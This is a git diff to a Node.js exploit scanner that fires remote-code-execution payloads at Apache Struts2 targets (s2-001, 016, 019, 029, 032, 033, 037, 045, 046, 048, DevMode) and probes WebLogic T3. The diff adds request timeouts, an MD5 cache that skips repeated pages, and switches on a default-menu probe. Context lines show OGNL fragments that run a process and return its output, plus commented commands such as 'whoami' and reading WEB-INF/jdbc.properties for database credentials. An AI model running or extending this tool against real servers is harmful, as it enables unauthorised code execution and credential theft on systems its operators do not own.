@@ -3,10 +3,12 @@ var szMyName = 'M.T.X._2017-06-08',
 	urlObj = require('url'),
 	child_process = require("child_process"),
 	net = require('net'),
+	crypto = require('crypto'),
 	path        = require("path"),
 	fs = require('fs'),
 	url = "",bReDo = false, szLstLocation = "",
 	g_oRst = {},
+	timeout = 15000,
 	iconv = require("iconv-lite"),
 	a = process.argv.splice(2),
 	bRunHost = false,
@@ -53,7 +55,7 @@ process.env.NODE_ENV = "production";
 // 基于socket发送数据
 function fnSocket(h,p,szSend,fnCbk)
 {
-	const client = net.connect({"port": p,"host":h}, () => 
+	const client = net.connect({"port": p,"host":h,"timeout":timeout}, () => 
 	{
 	  client.write(szSend);
 	});
@@ -66,7 +68,6 @@ function fnSocket(h,p,szSend,fnCbk)
 }
 
 // check weblogic T3
-// java -jar ~/safe/mtx_jfxl/jfxl.jar 127.0.0.1:7001
 function checkWeblogicT3(h,p)
 {
 	var s  = "t3 12.1.2\nAS:2048\nHL:19\n\n";
@@ -148,7 +149,7 @@ function fnTest(s)
 {
 	request(
 	    { method: s ||'PUT'
-	    , uri: url//.substr(0,url.lastIndexOf("/"))
+	    ,"timeout":timeout, uri: url//.substr(0,url.lastIndexOf("/"))
 	    ,headers:{'Access-Control-Request-Method':'GET,HEAD,POST,PUT,DELETE,CONNECT,OPTIONS,TRACE,PATCH'}
 	    , multipart:'HEAD' == s|| 'OPTIONS' == s? null:
 	      [ { 'content-type': 'application/json'
@@ -195,7 +196,7 @@ function fnTest(s)
 
 function doStruts2_046(url)
 {
-	request({method: 'POST',uri: url,"formData":
+	request({method: 'POST',"timeout":timeout,uri: url,"formData":
 		{
 			custom_file:
 			{
@@ -219,7 +220,7 @@ function doStruts2_032(url)
 	var oParms = {};
 	oParms["method:" + encodeURIComponent(g_postData)] = "";
 	oParms["mtxtest"] = "ok";
-	request({method: 'POST',uri: url,"formData":oParms},
+	request({method: 'POST',"timeout":timeout,uri: url,"formData":oParms},
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-032");
@@ -231,7 +232,7 @@ function doStruts2_032(url)
 function doStruts2_037(url)
 {
 	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ":mtx.toString.json?ok=1";
-	request({method: 'POST',uri: url},
+	request({method: 'POST',"timeout":timeout,uri: url},
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-037");
@@ -241,7 +242,7 @@ function doStruts2_037(url)
 function doStruts2_033(url)
 {
 	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ",mtx.toString.json?ok=1";
-	request({method: 'POST',uri: url},
+	request({method: 'POST',"timeout":timeout,uri: url},
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-037");
@@ -269,7 +270,7 @@ function doStruts2_048(url,fnCbk)
         "name": g_postData || payload,
         "age": 20
     };
-    request({method: 'POST',uri: url,"formData":data,"headers":{Referer:url}},
+    request({method: 'POST',"timeout":timeout,uri: url,"formData":data,"headers":{Referer:url}},
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-048");
@@ -301,7 +302,7 @@ function doStruts2_016(url)
 		+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
 		+ ".(#ros.flush()).(#ros.close())}");
 	////////////////////////*/
-	request({method: 'GET',encoding: null,uri: url + "?redirect:" + encodeURIComponent(g_postData)
+	request({method: 'GET',"timeout":timeout,encoding: null,uri: url + "?redirect:" + encodeURIComponent(g_postData)
 		}, 
     	function(e,r,b)
     {
@@ -410,7 +411,7 @@ function doStruts2_045(url, fnCbk)
 {
 	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
 	//  && cat #curPath/WEB-INF/jdbc.propertis
-	request({method: 'POST',uri: url
+	request({method: 'POST',"timeout":timeout,uri: url
 	    ,headers:
 	    {
 	    	"User-Agent": g_szUa,
@@ -431,7 +432,7 @@ function doStruts2_DevMode(url)
 {
 	// debug=browser&object=
 	// debug=command&expression=
-	request({method: 'POST',uri: url + "?debug=browser&expression=" + encodeURIComponent(g_postData) + ":xx.toString.json&ok=1"},
+	request({method: 'POST',"timeout":timeout,uri: url + "?debug=browser&expression=" + encodeURIComponent(g_postData) + ":xx.toString.json&ok=1"},
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-DevMode");
@@ -443,7 +444,7 @@ function doStruts2_DevMode(url)
 function doStruts2_001(url)
 {
 	// 如果编码encodeURIComponent 就会导致不执行？
-	request({method: 'POST',uri: url + "?name=" + (g_postData)},
+	request({method: 'POST',"timeout":timeout,uri: url + "?name=" + (g_postData)},
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-001,s2-012");
@@ -455,7 +456,7 @@ function doStruts2_019(url, fnCbk)
 {
 	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
 	//  && cat #curPath/WEB-INF/jdbc.propertis
-	request({method: 'POST',uri: url,
+	request({method: 'POST',"timeout":timeout,uri: url,
 		"formData":{"debug":"command","expression":encodeURIComponent(g_postData)}
 	    ,headers:
 	    {
@@ -492,7 +493,7 @@ function doStruts2_029(url, fnCbk)
 
 		
 
-	request({method: 'POST',uri: url,
+	request({method: 'POST',"timeout":timeout,uri: url,
 		"formData":{"message":encodeURIComponent(szDPt)}
 	    ,headers:
 	    {
@@ -605,6 +606,10 @@ function fnGetErrMsg(body)
 	}
 	return "";
 }
+
+// 避免重复处理
+var g_HtmlMd5Cf = {};
+
 // 检查ta3默认菜单
 function fnCheckTa3(u)
 {
@@ -613,7 +618,7 @@ function fnCheckTa3(u)
 	else u += '/';
 	var s = __dirname + "/urls/ta3menu.txt",a,i = 0,fnCbk = function(url)
 	{
-		request({method: 'GET',uri: u + url
+		request({method: 'GET',"timeout":timeout,uri: u + url
 		    ,headers:
 		    {
 		    	"User-Agent": g_szUa
@@ -621,8 +626,15 @@ function fnCheckTa3(u)
 		}
 		, function (error, response, body)
 		{
-			if(body)
+			if(!error && body)
 			{
+				var md5sum = crypto.createHash('md5');
+				md5sum.update(body.toString());
+				var szMd5 = md5sum.digest('hex');
+				if(g_HtmlMd5Cf[szMd5])return;
+				g_HtmlMd5Cf[szMd5] = 1;
+				// content-length 不同来判断不同值
+				// if(!response.headers['content-length'])console.log(body)
 				fnDoBody(body,"ta3menus");
 				if(200 === response.statusCode)
 				{
@@ -674,7 +686,7 @@ request.post(//  + encodeURIComponent(g_postData)
 if(0 < a.length)
 {
 	//*
-	// fnCheckTa3(url);
+	fnCheckTa3(url);
 	doStruts2_001(url);
 	doStruts2_016(url);
 	doStruts2_019(url);
